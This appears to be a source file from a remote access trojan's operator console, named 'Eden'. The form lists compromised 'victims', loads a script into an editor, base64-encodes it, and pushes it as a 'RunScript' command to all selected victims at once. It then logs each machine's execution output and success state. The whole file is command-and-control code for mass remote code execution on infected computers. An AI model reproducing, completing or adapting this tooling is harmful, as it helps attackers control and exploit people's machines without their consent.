using ICSharpCode.TextEditor;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmMultiScript : Form
    {
        private List<clsVictim> m_lsVictim { get; init; }
        private TextEditorControl editor = new TextEditorControl();

        public frmMultiScript(List<clsVictim> lsVictim)
        {
            InitializeComponent();

            m_lsVictim = lsVictim;
            Text = @$"MultiScript\\Victim[{lsVictim.Count}]";
        }

        void fnRecv(clsClient clnt, string szVictimID, List<string> lsMsg)
        {
            if (!m_lsVictim.Select(x => x.m_szID).ToList().Contains(szVictimID))
                return;

            if (lsMsg[0] == "exec")
            {
                if (lsMsg[1] == "code")
                {
                    int nCode = int.Parse(lsMsg[2]);
                    string szOutput = lsMsg[3];

                    Invoke(new Action(() =>
                    {
                        richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {(nCode == 1 ? "Run code successfully:" : "Run code failed:")}");
                        richTextBox1.AppendText(Environment.NewLine);
                        richTextBox1.AppendText(szOutput);
                        richTextBox1.AppendText(Environment.NewLine);

                        ListViewItem? item = listView1.FindItemWithText(szVictimID);
                        if (item == null)
                            return;

                        item.SubItems[1].Text = nCode == 1 ? "OK" : "Failed";
                    }));
                }
            }
        }

        void fnSetup()
        {
            listView1.View = View.Details;
            listView1.FullRowSelect = true;

            listView1.Columns.Add("ID", 200);
            listView1.Columns.Add("State");

            foreach (var victim in m_lsVictim)
            {
                victim.m_clnt.ServerMessageReceived += fnRecv;

                ListViewItem item = new ListViewItem(victim.m_szID);
                item.SubItems.Add("?");

                listView1.Items.Add(item);
            }

            toolStripStatusLabel1.Text = $"Victim[{m_lsVictim.Count}]";

            tabControl1.TabPages[0].Controls.Add(editor);
            editor.Dock = DockStyle.Fill;

            editor.Text = string.Empty;
            editor.Refresh();
        }

        private void frmMultiScript_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    editor.Text = File.ReadAllText(ofd.FileName);
                    editor.Refresh();
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    File.WriteAllText(sfd.FileName, editor.Text);
                    MessageBox.Show("Save file successfully: " + sfd.FileName, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    File.WriteAllText(sfd.FileName, richTextBox1.Text);
                    MessageBox.Show("Save file successfully: " + sfd.FileName, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void frmMultiScript_FormClosed(object sender, FormClosedEventArgs e)
        {
            foreach (var victim in m_lsVictim)
                victim.m_clnt.ServerMessageReceived -= fnRecv;
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            richTextBox1.Clear();
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            tabControl1.SelectedIndex = 1;

            string b64 = EZCrypto.Encoder.stre2b64(editor.Text);

            foreach (var victim in m_lsVictim)
            {
                victim.fnSendCommand(new string[]
                {
                    "RunScript",
                    "code",
                    b64,
                });
            }
        }
    }
}
